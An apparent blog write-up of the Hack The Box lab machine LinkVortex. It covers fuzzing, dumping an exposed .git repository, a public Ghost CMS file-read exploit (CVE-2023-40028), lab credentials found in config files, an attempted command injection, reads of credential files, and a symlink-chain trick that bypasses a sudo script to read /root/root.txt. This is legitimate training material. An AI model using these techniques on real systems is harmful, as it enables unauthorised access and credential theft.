---
title: LinkVortex
date: 2025-05-10 21:57:00 +0100
categories: [ctf, htb]
tags: [web, linux] 
image: https://res.cloudinary.com/djo6idowf/image/upload/v1746901187/LinkVortex_ntqfun.png
---
## Box Information

[LinkVortex](https://app.hackthebox.com/machines/LinkVortex) is an Easy machine released on 7th December 2025 on Hack The Box.

User Flag: `e54eecdc5fb3a4368b68a44279f61569` 

Root Flag: `75025db2a48dc5b1a9bd6d365a9c7fe2`

## Write-up

As always, start off with a standard Nmap scan of the target. Both TCP & UDP.

`sudo nmap -sT -A -T4 -Pn 10.10.11.47`

```plaintext
Starting Nmap 7.95 ( <https://nmap.org> ) at 2025-03-31 11:12 EDT
Nmap scan report for 10.10.11.47
Host is up (0.030s latency).
Not shown: 998 closed tcp ports (conn-refused)
PORT   STATE SERVICE VERSION
22/tcp open  ssh     OpenSSH 8.9p1 Ubuntu 3ubuntu0.10 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey:
|   256 3e:f8:b9:68:c8:eb:57:0f:cb:0b:47:b9:86:50:83:eb (ECDSA)
|_  256 a2:ea:6e:e1:b6:d7:e7:c5:86:69:ce:ba:05:9e:38:13 (ED25519)
80/tcp open  http    Apache httpd
|_http-title: Did not follow redirect to <http://linkvortex.htb/>
|_http-server-header: Apache
Device type: general purpose
Running: Linux 5.X
OS CPE: cpe:/o:linux:linux_kernel:5.0
OS details: Linux 5.0, Linux 5.0 - 5.14
Network Distance: 2 hops
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel

TRACEROUTE (using proto 1/icmp)
HOP RTT     ADDRESS
1   0.00 ms 10.10.14.1
2   0.00 ms 10.10.11.47

OS and Service detection performed. Please report any incorrect results at <https://nmap.org/submit/> .
Nmap done: 1 IP address (1 host up) scanned in 10.13 seconds
```

`sudo nmap -sU -A -T4 -Pn 10.10.11.47`

```plaintext
Starting Nmap 7.95 ( <https://nmap.org> ) at 2025-03-31 11:19 EDT
Warning: 10.10.11.47 giving up on port because retransmission cap hit (6).
Nmap scan report for 10.10.11.47
Host is up (0.025s latency).
Not shown: 982 closed udp ports (port-unreach)
PORT      STATE         SERVICE         VERSION
68/udp    open|filtered dhcpc
518/udp   open|filtered ntalk
4672/udp  open|filtered rfa
6050/udp  open|filtered x11
18228/udp open|filtered unknown
19647/udp open|filtered unknown
19933/udp open|filtered unknown
20217/udp open|filtered unknown
20717/udp open|filtered unknown
21167/udp open|filtered unknown
21644/udp open|filtered unknown
30544/udp open|filtered unknown
30975/udp open|filtered unknown
31109/udp open|filtered unknown
32774/udp open|filtered sometimes-rpc12
32798/udp open|filtered unknown
34433/udp open|filtered unknown
35438/udp open|filtered unknown
Too many fingerprints match this host to give specific OS details
Network Distance: 2 hops

TRACEROUTE (using port 23531/udp)
HOP RTT      ADDRESS
1   24.00 ms 10.10.14.1
2   24.00 ms 10.10.11.47

OS and Service detection performed. Please report any incorrect results at <https://nmap.org/submit/> .
Nmap done: 1 IP address (1 host up) scanned in 1250.68 seconds
```

Add the host to `/etc/hosts` so that we can use the hostname.

![](https://res.cloudinary.com/djo6idowf/image/upload/v1746895508/image_tr39a4.png)

`sudo nano /etc/hosts`

Add `linkvortex.htb`to the hosts file and then we can browse to site and check it out. First thing of note is that the site uses some software called ‘Ghost’. We can go ahead and check that out.

![](https://res.cloudinary.com/djo6idowf/image/upload/v1746895516/image_wmq4xp.png)

![](https://res.cloudinary.com/djo6idowf/image/upload/v1746900807/image_uhx3ac.png)

![](https://res.cloudinary.com/djo6idowf/image/upload/v1746900816/image_obwg7s.png)

Initial enumeration revealed that the target is running Ghost, a popular open-source blogging platform, on an Apache web server. With no immediate vulnerabilities apparent, I decided to proceed with directory enumeration to discover any hidden or interesting paths that might be accessible.

`gobuster dir -u http://linkvortex.htb -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt -b 301`

```plaintext
[+] Url:                     <http://linkvortex.htb>
[+] Method:                  GET
[+] Threads:                 10
[+] Wordlist:                /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt
[+] Negative Status codes:   301
[+] User Agent:              gobuster/3.6
[+] Timeout:                 10s
===============================================================
Starting gobuster in directory enumeration mode
===============================================================
/LICENSE              (Status: 200) [Size: 1065]
/http%3A%2F%2Fwww     (Status: 404) [Size: 196]
/http%3A%2F%2Fyoutube (Status: 404) [Size: 196]
/http%3A%2F%2Fblogs   (Status: 404) [Size: 196]
/http%3A%2F%2Fblog    (Status: 404) [Size: 196]
/**http%3A%2F%2Fwww   (Status: 404) [Size: 196]
/server-status        (Status: 403) [Size: 199]
/http%3A%2F%2Fcommunity (Status: 404) [Size: 196]
/http%3A%2F%2Fradar   (Status: 404) [Size: 196]
/http%3A%2F%2Fjeremiahgrossman (Status: 404) [Size: 196]
/http%3A%2F%2Fweblog  (Status: 404) [Size: 196]
/http%3A%2F%2Fswik    (Status: 404) [Size: 196]
Progress: 220560 / 220561 (100.00%)
```

![](https://res.cloudinary.com/djo6idowf/image/upload/v1746895477/image_mjql2s.png)

`ffuf -u http://linkvortex.htb/#/portal/FUZZ -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt`

![](https://res.cloudinary.com/djo6idowf/image/upload/v1746900828/image_w98fra.png)

This is not an accurate output. Something is weird here. We need to filter on response size (12148).

`ffuf -u http://linkvortex.htb/#/portal/FUZZ -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt -fs 12148`

![](https://res.cloudinary.com/djo6idowf/image/upload/v1746900834/image_tzusq0.png)

`dirsearch -u http://linkvortex.htb/`

![](https://res.cloudinary.com/djo6idowf/image/upload/v1746900841/image_fh9rft.png)

We can then look into `robots.txt` as a starting point. And from there we can see that `/ghost` exists and if we take a look we will find that it reveal a login page.

![](https://res.cloudinary.com/djo6idowf/image/upload/v1746900849/image_lanpca.png)

![](https://res.cloudinary.com/djo6idowf/image/upload/v1746900854/image_xnzqbd.png)

After discovering the login page, I turned my attention to subdomain enumeration, as it's common for web applications to have different subdomains with their own login interfaces. To discover potential subdomains, I planned to use FFUF to fuzz the hostname pattern `http://FUZZ.linkvortex.htb`.

`ffuf -u http://FUZZ.linkvortex.htb -w /usr/share/wordlists/seclists/Discovery/Web-Content/common.txt -H "Host: FUZZ.linkvortex.htb"`

`ffuf -u http://FUZZ.linkvortex.htb -w /usr/share/wordlists/seclists/Discovery/Web-Content/big.txt -H "Host: FUZZ.linkvortex.htb"`

Initial subdomain enumeration using FFUF encountered some performance issues with the initial command syntax. After correcting the command structure by removing the redundant FUZZ parameter from the URL portion, the scan proceeded more efficiently.

`ffuf -u http://linkvortex.htb/ -w /usr/share/seclists/Discovery/Web-Content/big.txt -H "Host:FUZZ.linkvortex.htb" -mc 200`

```plaintext
________________________________________________
 :: Method           : GET
 :: URL              : <http://linkvortex.htb/>
 :: Wordlist         : FUZZ: /usr/share/seclists/Discovery/Web-Content/big.txt
 :: Header           : Host: FUZZ.linkvortex.htb
 :: Follow redirects : false
 :: Calibration      : false
 :: Timeout          : 10
 :: Threads          : 40
 :: Matcher          : Response status: 200
 ________________________________________________
 dev                     [Status: 200, Size: 2538, Words: 670, Lines: 116, Duration: 19ms]
```

[http://dev.linkvortex.htb/](http://dev.linkvortex.htb/)

After discovering the subdomain with FFUF, I added the entry `dev.linkvortex.htb` to my `/etc/hosts` file.

![](https://res.cloudinary.com/djo6idowf/image/upload/v1746900861/image_ccbtlm.png)

![](https://res.cloudinary.com/djo6idowf/image/upload/v1746900866/image_kcdwg2.png)

We can now do further enumeration of the subdomain.

`dirsearch -u http://dev.linkvortex.htb/`

```plaintext
[07:07:01] 301 -  239B  - /.git  ->  <http://dev.linkvortex.htb/.git/>        
[07:07:01] 200 -  201B  - /.git/config
[07:07:01] 200 -   73B  - /.git/description
[07:07:01] 200 -  557B  - /.git/                                            
[07:07:01] 200 -   41B  - /.git/HEAD
[07:07:01] 200 -  402B  - /.git/info/                                       
[07:07:01] 200 -  240B  - /.git/info/exclude
[07:07:01] 200 -  620B  - /.git/hooks/                                      
[07:07:01] 200 -  175B  - /.git/logs/HEAD
[07:07:02] 200 -  401B  - /.git/logs/                                       
[07:07:02] 200 -  147B  - /.git/packed-refs                                 
[07:07:02] 200 -  418B  - /.git/objects/                                    
[07:07:02] 200 -  393B  - /.git/refs/                                       
[07:07:02] 200 -  691KB - /.git/index                                       
[07:07:02] 403 -  199B  - /.ht_wsr.txt                                      
[07:07:02] 403 -  199B  - /.htaccess.orig                                   
[07:07:02] 403 -  199B  - /.htaccessOLD
[07:07:02] 301 -  249B  - /.git/refs/tags  ->  <http://dev.linkvortex.htb/.git/refs/tags/>
[07:07:02] 403 -  199B  - /.htaccess.bak1
[07:07:02] 403 -  199B  - /.htaccess.sample
[07:07:02] 403 -  199B  - /.htaccess.save
[07:07:02] 403 -  199B  - /.htaccessOLD2
[07:07:02] 403 -  199B  - /.htaccessBAK                                     
[07:07:02] 403 -  199B  - /.htaccess_extra
[07:07:02] 403 -  199B  - /.htaccess_orig
[07:07:02] 403 -  199B  - /.htaccess_sc                                     
[07:07:02] 403 -  199B  - /.htm                                             
[07:07:02] 403 -  199B  - /.html
[07:07:02] 403 -  199B  - /.htpasswd_test                                   
[07:07:02] 403 -  199B  - /.htpasswds                                       
[07:07:02] 403 -  199B  - /.httr-oauth                                      
[07:07:23] 403 -  199B  - /cgi-bin/                                         
[07:07:48] 403 -  199B  - /server-status/                                   
[07:07:48] 403 -  199B  - /server-status
```

Brilliant, there’s a `/.git` directory. Which is likely to hold some treasures for us to explore.

![](https://res.cloudinary.com/djo6idowf/image/upload/v1746900873/image_ormvao.png)

![](https://res.cloudinary.com/djo6idowf/image/upload/v1746900878/image_s8ask9.png)

We can then download the git repository with git-dumper and then explore the repository locally.

`git-dumper http://dev.linkvortex.htb/.git/ ./linkvortex_git_repositor`

![](https://res.cloudinary.com/djo6idowf/image/upload/v1746900884/image_ulxzdb.png)

We can't see anything immediately obvious in here. Let's check the commit messages.

`cd linkvortex_git_repository`

`git log`

```plaintext
commit 299cdb4387763f850887275a716153e84793077d (HEAD, tag: v5.58.0)
Author: Ghost CI <41898282+github-actions[bot]@users.noreply.github.com>
Date:   Fri Aug 4 15:02:54 2023 +0000

    v5.58.0

commit dce2e68c9a620e9534f723a94dbb5f33c9e43034
Author: Djordje Vlaisavljevic <dzvlais@gmail.com>
Date:   Fri Aug 4 15:15:57 2023 +0100

    Added Tips&Donations link to portal links (#17580)

    refs <https://github.com/TryGhost/Product/issues/3677>

    - Added Tips&Donations link to Portal links in Membership settings for
      easy access
    - Updated other links to pass `no-action` lint rule

    ---------

    Co-authored-by: Sag <guptazy@gmail.com>

commit 356256067c378590d2ffc77906b04aea69d3b36b
Author: Sam Lord <sam@ghost.org>
Date:   Fri Aug 4 13:07:20 2023 +0100

    Data generator: Ensure order of newsletters is correct

    no issue

commit 4ff467794f60e4e6ae6935bafc5d72c94c145837
Author: Sam Lord <sam@ghost.org>
Date:   Wed Aug 2 14:43:26 2023 +0100

    Entirely rewrote data generator to simplify codebase

    refs: <https://github.com/TryGhost/DevOps/issues/11>

    This is a pretty huge commit, but the relevant points are:
    * Each importer no longer needs to be passed a set of data, it just gets the data it needs
    * Each importer specifies its dependencies, so that the order of import can be determined
      at runtime using a topological sort
    * The main data generator function can just tell each importer to import the data it has

    This makes working on the data generator much easier.

    Some other benefits are:
    * Batched importing, massively speeding up the whole process
    * `--tables` to set the exact tables you want to import, and specify the quantity of each

commit cf947bc4d6a3b56791488afd8c2016b95eee7df1
Author: Jono M <reason.koan@gmail.com>
Date:   Fri Aug 4 12:24:19 2023 +0100

    Optimised react-query caching to prevent excessive requests (#17595)

    refs <https://github.com/TryGhost/Product/issues/3349>

commit 77cc6df64a2237337e301e633c7399367754fc9c
Author: Peter Zimon <zimo@ghost.org>
Date:   Fri Aug 4 11:42:54 2023 +0200

    AdminX Newsletters refinements (#17594)

    refs. <https://github.com/TryGhost/Product/issues/3601>

    - added tableCell hover pointer cursor
    - updated Stripe connect button copy
    - added bottom margin to main container for better scrolling / navigation highlighting

commit 24ea4c0fb9a4e71dc23aafbcbf144ac105873ac5
Author: Djordje Vlaisavljevic <dzvlais@gmail.com>
Date:   Thu Aug 3 22:46:26 2023 +0100

    Updated Tips&Donations portal success and loading states design (#17592)

    refs <https://github.com/TryGhost/Product/issues/3677>

    - Updated portal loading design when user clicks on a Tips&Donations
      link
    - Removed "Retry" button from error state and added "Close"

commit be7a2d0aec8505d8f99de51320dcbb867247bd50
Author: Djordje Vlaisavljevic <dzvlais@gmail.com>
Date:   Thu Aug 3 22:37:25 2023 +0100

    Updated Tips & donations settings design (#17591)

    refs <https://github.com/TryGhost/Product/issues/3667>

    - Moved Tips&Donations out of `SignupFormEmbed` component and into its
      own component
    - Removed the enable/disable toggle for Tips&Donations and added
      Expand/Close button instead

commit 7f6de07b1efa768c15861de07b793d14767f433e
Author: Sag <guptazy@gmail.com>
Date:   Thu Aug 3 23:00:42 2023 +0200

    Removed unconsistent success state from the donation page (#17590)

    refs <https://github.com/TryGhost/Product/issues/3650>

commit 7e9b2d4883c3c287d2cff78a30a7b29df2573b10
Author: Sag <guptazy@gmail.com>
Date:   Thu Aug 3 22:45:57 2023 +0200

    Fixed donations checkout for logged-off readers (#17589)

    closes <https://github.com/TryGhost/Product/issues/3663>

commit 19bdb0efef63026ced69aa65c01b25e4e4b0b623
Author: Sag <guptazy@gmail.com>
Date:   Thu Aug 3 22:13:47 2023 +0200

    Added migrations for Tips & Donations' settings (#17576)

    closes <https://github.com/TryGhost/Product/issues/3668>

    - Tips and Donations feature offers two settings: "donations_currency", and
      "donations_suggested_amount"
        - "donation_currency": the currency to be used for the donation. Defaults to "USD", not
          nullable.
        - "donation_suggested_amount": an anchor price for the donation. Defaults to 0, not
          nullable.
    - Both settings belong to a new group "donations"

    Tech Spec: <https://www.notion.so/ghost/Tech-Spec-5cd6929f7960462ebcbf198176e0d899>?
    pvs=4#6e8b34c45f0c4c78b48c9e7725a307c8

commit c06ba9bec909a1f6729787ca3b5b5f84661c5cb1
Author: John O'Nolan <john@onolan.org>
Date:   Thu Aug 3 20:41:10 2023 +0100

    2023 (2)

commit 265e62229f7ab45bfa420a251370390b8649ac1d
Author: John O'Nolan <john@onolan.org>
Date:   Thu Aug 3 20:40:44 2023 +0100

    2023

commit 21f57c5ab5ba9f413facb92798bf05e9951636db
Author: Jono M <reason.koan@gmail.com>
Date:   Thu Aug 3 18:26:59 2023 +0100

    Added remaining wiring to AdminX Newsletters (#17587)

    refs <https://github.com/TryGhost/Product/issues/3601>

    - Wired up add newsletter modal
    - Fixed bugs with editing newsletters
    - Added archive/reactivate modals

commit d960b1284db343a1cfe7410450f9fc328197cf4a
Author: Peter Zimon <zimo@ghost.org>
Date:   Thu Aug 3 18:32:30 2023 +0200

    Added enable newsletter toggle in AdminX settings (#17582)

    refs. <https://github.com/TryGhost/Product/issues/3601>

    ---------

    Co-authored-by: Jono Mingard <reason.koan@gmail.com>

commit af7ce52708fad34b35b9aff75e4b1730f8c3dcf4
Author: Steve Larson <9larsons@gmail.com>
Date:   Thu Aug 3 10:10:31 2023 -0500

    Added source to beta editor feedback (#17586)

    no refs
    - will return post, page, or settings

commit f26203f8cbbefc2aee0f8e69a830568e51f48b59
Author: Djordje Vlaisavljevic <dzvlais@gmail.com>
Date:   Thu Aug 3 15:28:11 2023 +0100

    Updated Tips & donations settings (#17585)

    refs <https://github.com/TryGhost/Product/issues/3667>

    - Updated Tips & Donations settings with improved copy and more compact
      layout

commit 262c6be70f136842f2fd8307cc06835264d0d726
Author: Michael Barrett <991592+mike182uk@users.noreply.github.com>
Date:   Thu Aug 3 13:26:19 2023 +0100

    Fixed member filtering on newsletter subscription status (#17583)

    fixes <https://github.com/TryGhost/Product/issues/3684>

    The `nql` used for filtering newsletter members needed tweaking to make
    sure the provided query was parsed as a single `AND` query. This commit
    also fixes an issue where on page reload the filters were not being
    applied correctly

commit 81ef2ade39e57c8431585d971ba6c601278441a3
Merge: c467611 34b6f19
Author: Ghost CI <41898282+github-actions[bot]@users.noreply.github.com>
Date:   Thu Aug 3 10:25:36 2023 +0000

    Merged v5.57.3 into main

commit 34b6f1917fdd2dbeeb3eea302d33295f1eace4c5 (grafted, tag: v5.57.3)
Author: Ghost CI <41898282+github-actions[bot]@users.noreply.github.com>
Date:   Thu Aug 3 10:25:34 2023 +0000

    v5.57.3

commit c46761199bb9a32feed787465ce747b43cafb1d9 (grafted)
Author: Jono M <reason.koan@gmail.com>
Date:   Thu Aug 3 09:29:14 2023 +0100

    Cleaned up AdminX API handling (#17571)

    refs <https://github.com/TryGhost/Product/issues/3349>

    - Simplified a few more places after switching to react-query
    - Improved how mocking works in specs to be more scalable as the number
      of queries increases
```

After reviewing the git commits and finding no useful information, I decided to explore the repository files directly. During this exploration, I discovered a file named `authentication.test.js` that contained potential credentials.

`/linkvortex_git_repository/ghost/core/test/regression/api/admin/authentication.test.js`

![](https://res.cloudinary.com/djo6idowf/image/upload/v1746900896/image_gwclwb.png)

[http://linkvortex.htb/ghost/](http://linkvortex.htb/ghost/)

Tried logging in and they didn't work.

![](https://res.cloudinary.com/djo6idowf/image/upload/v1746900901/image_dhrsti.png)

Looking at the directory structure, I noticed we were in an 'admin' folder. This led me to try the email format `admin@linkvortex.htb`, which successfully worked as the login credentials.

`admin@linkvortex.htb:OctopiFociPilfer45`

![](https://res.cloudinary.com/djo6idowf/image/upload/v1746900907/image_hbh0rd.png)

There’s not a lot that you can do from the backend dashboard. We can then look for exploits in relation to `Ghost 5.58` .

![](https://res.cloudinary.com/djo6idowf/image/upload/v1746900913/image_bpuhod.png)

[https://github.com/0xDTC/Ghost-5.58-Arbitrary-File-Read-CVE-2023-40028](https://github.com/0xDTC/Ghost-5.58-Arbitrary-File-Read-CVE-2023-40028)

**Overview**

This script exploits a vulnerability in Ghost CMS (**CVE-2023-40028**) to read arbitrary files from the server. By leveraging a symlink in an uploaded ZIP file, an attacker can gain unauthorized access to sensitive files on the system.

**Features**

*   Automates login to the Ghost CMS admin API.
*   Crafts a malicious ZIP payload with a symlink to the target file.
*   Exploits the Ghost CMS import functionality to upload and extract the payload.
*   Fetches and displays the contents of the target file.

**Requirements**

*   Access to the target Ghost CMS instance (**credentials required**).
*   **curl**, **zip**, and basic Linux utilities installed on the attacker's system.

Ok, so we meet the requirements as we have a valid login to the Ghost backend and the box likely has ZIP installed so we can assume that this exploit will work.

`git clone https://github.com/0xDTC/Ghost-5.58-Arbitrary-File-Read-CVE-2023-40028`

`./CVE-2023-40028 -u admin@linkvortex.htb -p OctopiFociPilfer45 -h http://linkvortex.htb/`

![](https://res.cloudinary.com/djo6idowf/image/upload/v1746900919/image_vgj13o.png)

![](https://res.cloudinary.com/djo6idowf/image/upload/v1746900924/image_oqbjmd.png)

After gaining access, I landed in a restricted shell with very limited functionality, primarily useful for reading files. To move forward, the next step was to search for credentials or SSH keys that could be used to establish a more functional session, as this shell was insufficient for further exploitation.

`node` looks like a normal user because `1000` usually relates to users that can be logged in. We can also explore some files in `/etc` .

```plaintext
 /etc/passwd
 /etc/hostname
 /etc/motd
 /etc/group
```

It seems for the most part I can only read files in `/etc` . All other directories don’t seem to respond to the exploit, probably due to permissions of the user we have logged in with with the exploit.

`/etc/shadow` gives us a different error. Rather than a standard 'file not found' it gives something else:

![](https://res.cloudinary.com/djo6idowf/image/upload/v1746900931/image_wj0znq.png)

Is this a hint that this file might be possible to reach? Or it could just be that this file definitely exists because it should exist, but we don't have permission. I think we need to go down and find files specific to either Apache or Ghost. More to try.

So the error above seems to indicate that the files aren’t reachable. This is likely because the account that we logged on with for the exploit doesn’t have access to those files - not that the files necessarily don’t exist. So we need to test files that we are 100% sure will exist on the system and test whether are account has the write privileges to reach them. Such as:

```plaintext
/var/www/ghost/config.production.json
/var/www/ghost/content/data/ghost.db
/var/www/ghost/content/logs/ghost.log
/var/www/ghost/content/themes/casper/package.json
/var/www/ghost/content/themes/casper/default.hbs
/var/www/ghost/content/themes/casper/index.hbs
/var/www/ghost/content/images/example-image.jpg
/var/www/ghost/versions/5.58/package.json
/var/www/ghost/versions/5.58/core/server.js
/etc/apache2/sites-available/ghost.conf
/etc/apache2/sites-enabled/ghost.conf
/var/log/apache2/access.log
/var/log/apache2/error.log
```

```plaintext
/etc/resolv.conf
/etc/os-release
/home/node/.bash_history
/home/node/.ssh/id_rsa
/home/node/.ssh/known_hosts
```

Ok so at this point it's clear we are scrambling to find anything. Going back to the download repository and there is a file named `Dockerfile.ghost` at the top of the directory.

```plaintext
 FROM ghost:5.58.0
 
 # Copy the config
 COPY config.production.json /var/lib/ghost/config.production.json
 
 # Prevent installing packages
 RUN rm -rf /var/lib/apt/lists/* /etc/apt/sources.list* /usr/bin/apt-get /usr/bin/apt 
/usr/bin/dpkg /usr/sbin/dpkg /usr/bin/dpkg-deb /usr/sbin/dpkg-deb

 # Wait for the db to be ready first
 COPY wait-for-it.sh /var/lib/ghost/wait-for-it.sh
 COPY entry.sh /entry.sh
 RUN chmod +x /var/lib/ghost/wait-for-it.sh
 RUN chmod +x /entry.sh
 
 ENTRYPOINT ["/entry.sh"]
 CMD ["node", "current/index.js"]
```

We can see that the above file mentions a configuration file, so we can then go ahead and read that and then we find ourselves some credentials.

`/var/lib/ghost/config.production.json`

```plaintext
{
  "url": "<http://localhost:2368>",
  "server": {
    "port": 2368,
    "host": "::"
  },
  "mail": {
    "transport": "SMTP",
    "options": {
      "service": "Google",
      "host": "linkvortex.htb",
      "port": 587,
      "auth": {
        "user": "bob@linkvortex.htb",
        "pass": "fibber-talented-worth"
      }
    }
  },
  "logging": {
    "transports": ["stdout"]
  },
  "process": "systemd",
  "paths": {
    "contentPath": "/var/lib/ghost/content"
  },
  "spam": {
    "user_login": {
      "minWait": 1,
      "maxWait": 604800000,
      "freeRetries": 5000
    }
  }
}
```

`bob@linkvortex.htb:fibber-talented-worth`

Login and away we go.

![](https://res.cloudinary.com/djo6idowf/image/upload/v1746900937/image_dshn6y.png)

![](https://res.cloudinary.com/djo6idowf/image/upload/v1746900942/image_pdhplw.png)

Check what permissions `bob` has so we can look to escalate our privileges.

`sudo -l`

`bob` can run `/opt/ghost/clean_symlink.sh` as root. There aren’t any other files so this is a pretty big hint that this is likely the way to escalate privileges.

```plaintext
User bob may run the following commands on linkvortex:sh *.png
    (ALL) NOPASSWD: /usr/bin/bash /opt/ghost/clean_symlink.sh *.png
```

![](https://res.cloudinary.com/djo6idowf/image/upload/v1746900948/image_q7bkzc.png)

`bob` can read and execute the script but he can't edit it. And the file is owned by `root` .

**rwxr--r-:**

*   **rwx (Owner):** The owner (**root**) has full read, write, and execute permissions.
*   **r- (Group):** Members of the file's group (**root**) have read-only access.
*   **r- (Others):** Everyone else (including **bob**) has read-only access.

Let’s have a look at the contents and see what the script does.

`cat /opt/ghost/clean_symlink.sh`

```bash
#!/bin/bash

QUAR_DIR="/var/quarantined"

if [ -z "$CHECK_CONTENT" ]; then
  CHECK_CONTENT=false
fi

LINK=$1

if ! [[ "$LINK" =~ \\.png$ ]]; then
  /usr/bin/echo "! First argument must be a PNG file!"
  exit 2
fi

if /usr/bin/sudo /usr/bin/test -L "$LINK"; then
  LINK_NAME=$(/usr/bin/basename "$LINK")
  LINK_TARGET=$(/usr/bin/readlink "$LINK")

  if /usr/bin/echo "$LINK_TARGET" | /usr/bin/grep -Eq '(etc|root)'; then
    /usr/bin/echo "! Trying to read critical files, removing link [ $LINK ]!"
    /usr/bin/unlink "$LINK"
  else
    /usr/bin/echo "Link found [ $LINK ], moving it to quarantine"
    /usr/bin/mv "$LINK" "$QUAR_DIR/"
    
    if $CHECK_CONTENT; then
      /usr/bin/echo "Content:"
      /usr/bin/cat "$QUAR_DIR/$LINK_NAME" 2>/dev/null
    fi
  fi
fi
```

At first I didn’t really understand what the script was doing but I tried to use a command injection but it didn’t work.

`sudo /usr/bin/bash /opt/ghost/clean_symlink.sh *.png"; whoami"`

![](https://res.cloudinary.com/djo6idowf/image/upload/v1746900955/image_vwl3zv.png)

Analyzing the script a bit more now: the script resolves symbolic links step by step and only checks the immediate target for critical paths like `root` or `etc`. By creating a chain of symbolic links that obscures the final destination, we exploit this behavior to bypass the checks and read the contents of `/root/root.txt`.

To bypass the script’s checks and access the sensitive file `/root/root.txt`, I created a chain of symbolic links to obscure the target path and trick the script into processing it without detecting the final destination.

`ln -s /root/root.txt file.txt`

You create a symbolic link `file.txt` that directly points to the sensitive file `/root/root.txt`. This would likely fail if the script checks for paths containing `root`.

`ln -s file.txt file.txt`

You create another symbolic link `file.txt` that points to itself, obscuring the direct reference to `/root/root.txt`.

`ln -s /home/bob/file.txt file.png`

You create a `.png` symbolic link `file.png` that points to `file.txt`, which ultimately resolves to `/root/root.txt`.

`sudo CHECK_CONTENT=true /usr/bin/bash /opt/ghost/Clean_symlink.sh /home/bob/file.png`

The script processes `file.png`, resolves the chain of symlinks step by step, and accesses the contents of `/root/root.txt` without detecting the sensitive target.

![](https://res.cloudinary.com/djo6idowf/image/upload/v1746900961/image_k3gtlt.png)

![](https://res.cloudinary.com/djo6idowf/image/upload/v1746900965/image_ab3vwt.png)

## Thoughts

Overall I thought that his box was fairly nice. What I didn’t like was the mindless hunt through the git repository for a username and password buried within. Those types of challenges can feel like luck rather than skill, but to be honest I should be looking to automate the process of looking through multiple files for username & passwords strings.